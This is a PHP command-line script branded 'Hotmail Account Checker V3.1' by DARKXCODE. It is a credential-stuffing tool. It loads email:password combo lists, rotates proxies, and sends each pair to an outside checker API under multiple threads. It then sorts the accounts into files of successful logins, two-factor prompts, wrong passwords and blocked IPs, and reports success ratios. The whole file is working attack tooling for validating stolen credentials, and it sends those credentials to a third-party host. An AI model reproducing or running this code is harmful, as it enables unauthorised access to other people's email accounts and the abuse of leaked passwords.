<?php

// DONT CHANGE THIS
/*==========> INFO 
 * CODE     : BY ZLAXTERT
 * SCRIPT   : HOTMAIL ACCOUNT CHECKER
 * VERSION  : V3.1
 * TELEGRAM : t.me/zlaxtert
 * BY       : DARKXCODE
 */

//========> REQUIRE
require_once "function/function.php";
require_once "function/gangbang.php";
require_once "function/threesome.php";
require_once "function/settings.php";

//========> BANNER
echo banner();
echo banner2();

//========> GET FILE
enterlist:
echo "$WH [$GR+$WH] Your file ($YL example.txt $WH) $GR>> $BL";
$listname = trim(fgets(STDIN));
if (empty($listname) || !file_exists($listname)) {
    echo PHP_EOL . PHP_EOL . "$WH [$YL!$WH] $RD FILE NOT FOUND$WH [$YL!$WH]$DEF" . PHP_EOL . PHP_EOL;
    goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));

//=========> THREADS
reqemail:
echo "$WH [$GR+$WH] Threads ($YL Max 5 $WH) ($YL Recommended 2-3 $WH) $GR>> $BL";
$reqemail = trim(fgets(STDIN));
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 3 : $reqemail;
if ($reqemail > 5) {
    echo PHP_EOL . PHP_EOL . "$WH [$YL!$WH] $RD MAX 5$WH [$YL!$WH]$DEF" . PHP_EOL . PHP_EOL;
    goto reqemail;
} elseif ($reqemail < 2) {
    echo PHP_EOL . PHP_EOL . "$WH [$YL!$WH] $RD MIN 2$WH [$YL!$WH]$DEF" . PHP_EOL . PHP_EOL;
    goto reqemail;
}

//=========> COUNT
$live = 0;
$factor = 0;
$blckip = 0;
$wrpass = 0;
$die = 0;
$limit = 0;
$unknown = 0;
$no = 0;
$total = count($lists);
echo "\n\n$WH [$YL!$WH] TOTAL $GR$total$WH LISTS [$YL!$WH]$DEF\n\n";

//========> LOOPING
$rollingCurl = new \RollingCurl\RollingCurl();

foreach ($lists as $list) {
    if (empty(trim($list))) continue;
    
    // EXPLODE
    $exploded = multiexplode(array(":", "|", "/", ";", ""), $list);
    $email = $exploded[0] ?? '';
    $pass = $exploded[1] ?? '';
    
    if (empty($email) || empty($pass)) continue;
    
    // GET SETTINGS
    if (strtolower($mode_proxy) == "off") {
        $Proxies = "";
        $proxy_Auth = $proxy_pwd;
        $type_proxy = $proxy_type;
        $apikey = GetKey($iniApikey);
        $APIs = GetAPIs($thisAPIs);
    } else {
        $Proxies = GetProxy($proxy_list);
        $proxy_Auth = $proxy_pwd;
        $type_proxy = $proxy_type;
        $apikey = GetKey($iniApikey);
        $APIs = GetAPIs($thisAPIs);
    }
    
    // API
    $api = $APIs . "/checker/hotmail/?list=" . urlencode($list) . 
           "&proxy=" . urlencode($Proxies) . 
           "&proxyAuth=" . urlencode($proxy_Auth) . 
           "&type_proxy=" . urlencode($type_proxy) . 
           "&email=" . urlencode($email) . 
           "&pass=" . urlencode($pass) . 
           "&apikey=" . urlencode($apikey);
    
    // CURL
    $rollingCurl->setOptions(array(
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 200
    ))->get($api);
}

//==========> ROLLING CURL
$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
    global $listname, $no, $total, $live, $die, $unknown, $factor, $blckip, $wrpass, $limit;
    
    $no++;
    parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
    $list = $params["list"] ?? '';
    $exploded = multiexplode(array(":", "|", "/", ";", ""), $list);
    $email = $exploded[0] ?? '';
    $pass = $exploded[1] ?? '';
    
    // RESPONSE
    $x = $request->getResponseText();
    $js = json_decode($x, true);
    $msg = isset($js['data']['msg']) ? strtoupper($js['data']['msg']) : 'UNKNOWN';
    $ipAdd = $js['data']['ipaddress'] ?? 'null';
    $jamm = Jam();

    $thisMsg = ($msg == "") ? "die" : $msg;

    // GET COLORS
    $BL = collorLine("BL");
    $RD = collorLine("RD");
    $GR = collorLine("GR");
    $YL = collorLine("YL");
    $MG = collorLine("MG");
    $DEF = collorLine("DEF");
    $CY = collorLine("CY");
    $WH = collorLine("WH");

    // PROCESS RESPONSE
    if (strpos($x, "SUCCESS LOGIN!") !== false) {
        $live++;
        save_file("result/success.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF][$CY$jamm$DEF]$GR LIVE$DEF =>$BL $email|$pass$DEF | [$YL VALID$DEF:$GR true$DEF ] [$YL IP$DEF:$WH $ipAdd$DEF ] [$YL MSG$DEF: $GR$msg$DEF ] | BY$CY DARKXCODE$DEF (V3.1)" . PHP_EOL;
    } elseif (strpos($x, "Help us") !== false || strpos($x, "HELP US") !== false) {
        $factor++;
        save_file("result/help-us.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF][$CY$jamm$DEF]$GR LIVE$DEF =>$BL $email|$pass$DEF | [$YL VALID$DEF:$GR true$DEF ] [$YL IP$DEF:$YL $ipAdd$DEF ] [$YL MSG$DEF: $BL$msg$DEF ] | BY$CY DARKXCODE$DEF (V3.1)" . PHP_EOL;
    } elseif (strpos($x, "INCORRECT PASSWORD!") !== false) {
        $wrpass++;
        save_file("result/wrong-pass.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF][$CY$jamm$DEF]$YL WRONG PASS$DEF =>$BL $email|$pass$DEF | [$YL VALID$DEF:$RD false$DEF ] [$YL IP$DEF:$BL $ipAdd$DEF ] [$YL MSG$DEF: $WH$msg$DEF ] | BY$CY DARKXCODE$DEF (V3.1)" . PHP_EOL;
    } elseif (strpos($x, "BLOCK IPS!") !== false) {
        $blckip++;
        save_file("result/block-ip.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF][$CY$jamm$DEF]$RD DIE$DEF =>$BL $email|$pass$DEF | [$YL VALID$DEF:$RD false$DEF ] [$YL IP$DEF:$RD $ipAdd$DEF ] [$YL MSG$DEF: $RD$msg$DEF ] | BY$CY DARKXCODE$DEF (V3.1)" . PHP_EOL;
    } elseif (strpos($x, 'UNKNOWN RESPONS! PLEASE CONTACT OWNER!') !== false) {
        $die++;
        save_file("result/$thisMsg.txt", "$list => OWNER : https://t.me/zlaxtert");
        echo "[$RD$no$DEF/$GR$total$DEF][$CY$jamm$DEF]$RD DIE$DEF =>$BL $email|$pass$DEF | [$YL VALID$DEF:$RD false$DEF ] [$YL IP$DEF:$DEF null$DEF ] [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (V3.1)" . PHP_EOL;
    } elseif (strpos($x, '"status":"die"') !== false) {
        $die++;
        save_file("result/$thisMsg.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF][$CY$jamm$DEF]$RD DIE$DEF =>$BL $email|$pass$DEF | [$YL VALID$DEF:$RD false$DEF ] [$YL IP$DEF:$DEF null$DEF ] [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (V3.1)" . PHP_EOL;
    } elseif (strpos($x, 'Request Timeout') !== false || $x == "") {
        $die++;
        save_file("result/RTO.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF][$CY$jamm$DEF]$RD DIE$DEF =>$BL $email|$pass$DEF | [$YL VALID$DEF:$RD false$DEF ] [$YL IP$DEF:$DEF null$DEF ] [$YL MSG$DEF:$MG REQUEST TIMEOUT$DEF ] | BY$CY DARKXCODE$DEF (V3.1)" . PHP_EOL;
    } elseif (strpos($x, 'Many Requests') !== false) {
        $limit++;
        save_file("result/limit.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF][$CY$jamm$DEF]$RD LIMIT$DEF =>$BL $email|$pass$DEF | [$YL VALID$DEF:$RD false$DEF ] [$YL IP$DEF:$DEF null$DEF ] [$YL MSG$DEF:$MG REQUEST TOO MANY REQUESTS$DEF ] | BY$CY DARKXCODE$DEF (V3.1)" . PHP_EOL;
    } else {
        $unknown++;
        save_file("result/unknown.txt", "$x");
        echo "[$RD$no$DEF/$GR$total$DEF][$CY$jamm$DEF]$DEF UNKNOWN$DEF =>$BL $email|$pass$DEF | BY$CY DARKXCODE$DEF (V3.1)" . PHP_EOL;
    }
})->setSimultaneousLimit((int) $reqemail)->execute();

//============> END
echo PHP_EOL;
echo "================[DONE]================" . PHP_EOL;
echo " DATE          : " . $date . PHP_EOL;
echo " SUCCESS LOGIN : " . $live . PHP_EOL;
echo " HELP US       : " . $factor . PHP_EOL;
echo " WRONG PASS    : " . $wrpass . PHP_EOL;
echo " BLOCKIPS      : " . $blckip . PHP_EOL;
echo " ERROR         : " . $die . PHP_EOL;
echo " LIMIT         : " . $limit . PHP_EOL;
echo " UNKNOWN       : " . $unknown . PHP_EOL;
echo " TOTAL         : " . $total . PHP_EOL;
echo "======================================" . PHP_EOL;
echo "[+] RATIO SUCCESS LOGIN => $GR" . round(RatioCheck($live, $total)) . "%$DEF" . PHP_EOL;
echo "[+] RATIO HELP US       => $BL" . round(RatioCheck($factor, $total)) . "%$DEF" . PHP_EOL;
echo "[+] RATIO WRONG PASS    => $YL" . round(RatioCheck($wrpass, $total)) . "%$DEF" . PHP_EOL;
echo "[+] RATIO BLOCK IPS     => $WH" . round(RatioCheck($blckip, $total)) . "%$DEF" . PHP_EOL;
echo "[+] RATIO BLOCK ERROR   => $RD" . round(RatioCheck($die, $total)) . "%$DEF" . PHP_EOL . PHP_EOL;
echo "[!] NOTE : CHECK AGAIN FILE 'block-ip.txt' , 'RTO.txt' and 'unknown.txt' [!]" . PHP_EOL;
echo "This file '" . $listname . "'" . PHP_EOL;
echo "File saved in folder 'result/' " . PHP_EOL . PHP_EOL;

// ==========> FUNCTION
function collorLine($col) {
    $data = array(
        "GR" => "\e[32;1m",
        "RD" => "\e[31;1m",
        "BL" => "\e[34;1m",
        "YL" => "\e[33;1m",
        "CY" => "\e[36;1m",
        "MG" => "\e[35;1m",
        "WH" => "\e[37;1m",
        "DEF" => "\e[0m"
    );
    return $data[$col] ?? "\e[0m";
}

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}